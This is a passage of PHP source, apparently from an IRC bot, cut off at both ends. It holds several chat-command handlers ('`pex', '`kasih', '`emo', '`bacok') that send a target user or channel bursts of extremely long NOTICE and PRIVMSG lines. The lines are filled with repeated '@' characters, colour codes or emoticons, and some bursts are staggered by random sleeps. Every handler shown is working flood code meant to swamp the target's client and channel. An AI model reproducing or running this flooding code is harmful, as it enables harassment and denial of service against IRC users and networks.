							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
						}
						elseif ($com[3]==':`pex' && $com[4] && $com[5]) {
							$msg = strstr($data,":`pex");
							$msg = str_replace(":`pex $com[4] ","",$msg);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
						}
						elseif ($com[3]==':`kasih' && $com[4] && $com[5]) {
							$msg = strstr($data,":`kasih");
							$msg = str_replace(":`kasih $com[4] ","",$msg);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%038,1:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@_@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%0311,15:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@_@(G)'. CRL);
						}
						elseif ($com[3]==':`emo' && $com[4] && $com[5]) {
							$msg = strstr($data,":`emo");
							$msg = str_replace(":`emo $com[4] ","",$msg);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%038,1:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@_@(G)'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%0311,15:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@_@(G)'. CRL);
						}
						elseif ($com[3]==':`bacok' && $com[4] && $com[5]) {
							$msg = strstr($data,":`bacok");
							$msg = str_replace(":`bacok $com[4] ","",$msg);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%034,1X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%033X@%032X@_@'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%034,1X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%033X@%032X@_@'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%034,1X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%033X@%032X@_@'. CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%034,1X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%033X@%032X@_@'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%034,1X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%034X@%037X@%039X@%0312X@%0315X@%036X@%0313X@%033X@%0311X@%0314X@%035X@%0310X@%038X@%032X@%033X@%032X@_@'. CRL);
